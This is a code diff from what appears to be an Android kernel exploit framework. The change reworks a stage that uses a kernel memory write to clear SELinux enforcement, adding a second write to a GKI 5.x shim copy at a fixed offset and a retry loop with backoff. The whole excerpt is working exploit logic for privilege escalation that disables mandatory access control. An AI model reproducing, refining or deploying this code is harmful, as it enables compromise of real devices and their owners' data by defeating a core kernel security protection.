@@ -395,13 +395,36 @@ namespace ghostlock::session::backend {
                     w1_attempts = 1;
                 }
                 support::run_state::enter("w1a");
-                selinux_ok = retry_write_stage<M>(
-                    session,
-                    "W1: SELinux",
-                    session.addresses.data_alias(ghostlock::profile::selinux_enforcing()),
-                    1, w1_attempts,
-                    g_exploit_session.profile.w1_settle_us(),
-                    victim::verify_selinux_stage, nullptr, 0);
+                /* CLI parity (main.c W1/W1b): on GKI 5.x the primary
+                 * selinux_state and the exported shim copy at +0x34E8 are
+                 * distinct instances — selinuxfs and the LSM decision sites
+                 * read different ones, so each round must clear both. The
+                 * verify reads selinuxfs, which follows the shim. */
+                const uintptr_t w1_target = session.addresses.data_alias(
+                    ghostlock::profile::selinux_enforcing());
+                const bool w1_gki_shim =
+                    g_exploit_session.profile.kernel_major() == 5;
+                for (uint32_t attempt = 1;
+                     attempt <= w1_attempts && !selinux_ok; attempt++) {
+                    pr_info("W1: SELinux attempt %u/%u\n", attempt,
+                            w1_attempts);
+                    (void)retry_write_stage<M>(
+                        session, "W1: SELinux", w1_target, 1, 1,
+                        g_exploit_session.profile.w1_settle_us(),
+                        victim::verify_selinux_stage, nullptr, 0);
+                    if (w1_gki_shim) {
+                        (void)retry_write_stage<M>(
+                            session, "W1b: GKI shim", w1_target + 0x34E8,
+                            1, 1, g_exploit_session.profile.w1_settle_us(),
+                            victim::verify_selinux_stage, nullptr, 0);
+                    }
+                    selinux_ok = victim::verify_selinux_stage(nullptr) != 0;
+                    if (!selinux_ok) {
+                        pr_warning("W1 attempt %u/%u failed; backing off\n",
+                                   attempt, w1_attempts);
+                        usleep(100000);
+                    }
+                }
 
                 if (!selinux_ok) {
                     pr_warning("Write 1 failed\n");
